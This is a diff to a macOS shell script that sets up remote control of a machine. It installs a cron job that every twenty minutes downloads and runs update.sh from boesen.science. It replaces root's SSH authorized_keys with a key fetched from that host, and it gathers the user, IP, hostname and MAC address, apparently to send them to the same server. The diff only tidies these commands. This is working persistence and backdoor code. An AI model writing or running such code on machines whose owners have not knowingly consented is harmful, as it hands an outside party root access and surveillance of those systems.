@@ -13,7 +13,7 @@ dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.a
 
 # Unlike on Linux, we have to fully save the file rather than just piping it into bash.
 # On Macs, each line is executed separately, so things like variables won't work if we just pipe it.
-(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L boesen.science:2042/mac/update.sh --output /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh') | crontab -
+(crontab -l 2>/dev/null; echo '*/20 * * * * curl -Lo /tmp/update.sh boesen.science:2042/mac/update.sh; chmod +x /tmp/update.sh; /tmp/update.sh') | crontab -
 
 SSHPATH="/var/root/.ssh"
 
@@ -23,10 +23,9 @@ rm "$SSHPATH/authorized_keys" # Just in case
 curl -Lso "$SSHPATH/authorized_keys" boesen.science:2042/pubkey
 
 USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
-IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
+IP=`/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
 HOSTNAME=`hostname`
-# TODO: Check that this works
-MAC=`ifconfig en1 | awk '/ether/{print $2}'`
+MAC=`/sbin/ifconfig en1 | awk '/ether/{print $2}'`
 
 SERVER="boesen.science"
 PORT=2043
